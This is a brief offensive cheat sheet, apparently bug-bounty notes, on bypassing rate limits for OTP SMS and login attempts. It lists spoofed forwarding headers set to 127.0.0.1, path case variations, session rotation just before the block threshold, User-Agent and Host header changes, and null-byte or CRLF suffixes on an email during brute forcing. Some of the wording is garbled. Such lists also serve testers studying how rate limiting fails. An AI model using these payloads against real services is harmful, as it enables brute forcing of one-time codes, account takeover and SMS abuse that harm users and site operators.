# Rate Limit Bypass

1. Modify the number from xxxxx-xxxxx to +91 xxxxx-xxxxx
2. Remove the country code +91 to [ ]

### **Rate limit on OTP sms**

X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Ip: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forward-For: 127.0.0.1
Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-True-Ip: 127.0.0.1

- using the bellow headers is cause make new IP and rollout the server:
- use different Path
    - `sign-up -> Sign-up -> SignUp`
    

### Changing cookies

For example if it blocks by 15 Requests Change session on 14th request and try

### Change User Agent

User-agent: Linux → windows

### Change Host Header

Change Host: www.newsite.com
Change Host: localhost
Change Host:127.0.0.1

### using Null Chars

```
%00, %0d%0a, %09, %0C, %20, %0
```

```
>brute force using abc@xyz.com
	after some time
	you got blocked
>try abc@xyz.com%00

```